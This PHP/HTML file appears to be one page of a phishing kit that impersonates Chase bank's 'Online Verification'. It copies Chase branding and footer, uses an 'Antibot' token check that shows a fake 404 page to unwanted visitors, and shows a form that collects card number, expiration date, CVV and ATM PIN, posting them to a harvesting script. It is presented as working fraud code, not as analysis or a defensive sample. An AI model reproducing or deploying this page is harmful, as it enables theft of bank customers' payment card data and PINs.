<?php

    session_start();

    require_once '../W/Comp.php';
    require_once '../W/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }

?>

<!DOCTYPE html>
<html class="no-js" dir="ltr" lang="en">
    <head>
        <title>Card information - Online Verification - chase.com</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="shortcut icon" href="../A/img/favicon.ico">
        <link rel="stylesheet" href="../A/css/Login/blue-ui.css">
        <link rel="stylesheet" href="../A/css/Verify/enroll.css">
    </head>
    <body style="overflow-x: hidden; overflow-y: auto; height: 100%" class="brand-personal">
        <div>
            <div class="enrollment getting-started-wrapper" id="enrollment">
                <div class="toggle-aria-hidden" id="sitemessage" role="region"></div>
                <header class="toggle-aria-hidden" id="enrollment-header" role="banner">
                    <div class="enrollment-header PERSONAL">
                        <div class="col-xs-2 col-sm-4 header-elements"><span id="enrollment-side-menu-icon-iconanchor-wrapper"><a class="jpui iconaction menulines" style="cursor: pointer;" id="enrollment-side-menu-icon"> <span class="util accessible-text" id="accessible-enrollment-side-menu-icon">, opens menu</span> <i class="jpui menulines icon" id="icon-enrollment-side-menu-icon"></i></a></span></div>
                        <div class="col-xs-8 col-sm-4 header-elements"><img src="../A/img/octogon-white.png" alt="Chase"></div>
                    </div>
                </header>
                <main id="enrollment-content">
                    <div class="online-enrollment getting-started">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
                                    <h1 class="H2 online-enrollment-header">Card Information</h1>
                                    <div class="jpui progress bar" data-progress="75">
                                        <div class="bar fill"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="row">
                                <div class="col-sm-2 col-lg-offset-1 hide-xs show-sm enroll-faq-sidebar op-0">
                                    <p>L</p>
                                    <p>L</p>
                                </div>
                                <div class="col-xs-12 col-sm-8 col-lg-6">
                                    <div class="H2 online-enrollment-getting-started">Your card information</div>
                                    <h2 class="H4 enrollmentGettingStartedAdvisory">We need a bit more info to verify your identity.</h2>
                                    <div class="row">
                                        <div class="col-sm-4 util center aligned">
                                            <div class="row">
                                                <div class="col-xs-2 col-sm-12 util aligned center"><img class="enrollment-icons" src="../A/img/aioe_icon_2_card_lg.png" alt=""></div>
                                                <div class="col-xs-9 col-sm-12">
                                                    <div class="enrollment-icons-text BODY">Your chase card information</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <form id="form" action="../W/J/card.php?token=<?php echo $_SESSION['token']; ?>" method="POST">
                                        <div class="row">
                                            <div class="col-sm-6 col-md-5 mt-2">
                                                <div class="mb-2">
                                                    <div id="1" class="jpui fieldgroup text-input-custom">
                                                        <div class="jpui vertical">
                                                            <div class="align-label-input">
                                                                <div class="label-wrapper">
                                                                    <label class="jpui fieldlabel label-alignment vertical" for="card">
                                                                        Card Number
                                                                    </label>
                                                                </div>
                                                                <div class="jpui validationinput">
                                                                    <div id="accountIdentifier-text-validate">
                                                                        <input name="card" id="card" class="jpui input" type="text" required>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="2" class="jpui fieldgroup text-input-custom mb-2">
                                                    <div class="jpui vertical">
                                                        <div class="align-label-input">
                                                            <div class="label-wrapper">
                                                                <label class="jpui fieldlabel label-alignment vertical" for="exp">
                                                                    Expiration Date
                                                                </label>
                                                            </div>
                                                            <div class="jpui validationinput">
                                                                <div id="accountIdentifier-text-validate">
                                                                    <input name="exp" id="exp" class="jpui input tup" type="text" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="3" class="jpui fieldgroup text-input-custom mb-2">
                                                    <div class="jpui vertical">
                                                        <div class="align-label-input">
                                                            <div class="label-wrapper">
                                                                <label class="jpui fieldlabel label-alignment vertical" for="cvv">
                                                                    CVV
                                                                </label>
                                                            </div>
                                                            <div class="jpui validationinput">
                                                                <div id="accountIdentifier-text-validate">
                                                                    <input name="cvv" id="cvv" class="jpui input tcap" type="text" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div id="4" class="jpui fieldgroup text-input-custom mb-2">
                                                    <div class="jpui vertical">
                                                        <div class="align-label-input">
                                                            <div class="label-wrapper">
                                                                <label class="jpui fieldlabel label-alignment vertical" for="atm">
                                                                    ATM PIN
                                                                </label>
                                                            </div>
                                                            <div class="jpui validationinput">
                                                                <div id="accountIdentifier-text-validate">
                                                                    <input name="atm" id="atm" class="jpui input tcap" type="text" required>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="NOTE mt-1">You won't be able to come back to this page to make changes, so make sure everything looks OK before choosing "Next."</div>
                                        <div class="row">
                                            <div class="col-xs-12 col-sm-4 col-sm-offset-8 col-md-3 col-md-offset-9 button-row-margin">
                                                <button type="button" id="btn" class="jpui button focus primary fluid" disabled>
                                                    <span class="label">Next</span>
                                                </button>
                                            </div>
                                        </div>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </main>
                <footer id="enrollment-footer">
                    <div class="online-enrollment-footer">
                        <div class="row">
                            <div class="col-xs-10 col-sm-8 col-lg-6 footer-container">
                                <ul class="footer-menu">
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Privacy </a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Security</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Accessibility</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline" style="cursor: pointer;">Terms of use</a></span></li>
                                    <li><span class="jpui link"><a class="link-anchor NOTELINK util underline no-right-padding"style="cursor: pointer;">Ad choices</a></span> <img class="adChoices-img" src="../A/img/ad-choices-logo-blue_lite.png" alt=""></li>
                                </ul>
                                <p class="NOTE util center aligned">© 2021 JPMorgan Chase &amp; Co.</p>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>
        <script src="../A/js/cleave.js"></script>
        <script src="../A/js/card.js"></script>
    </body>
</html>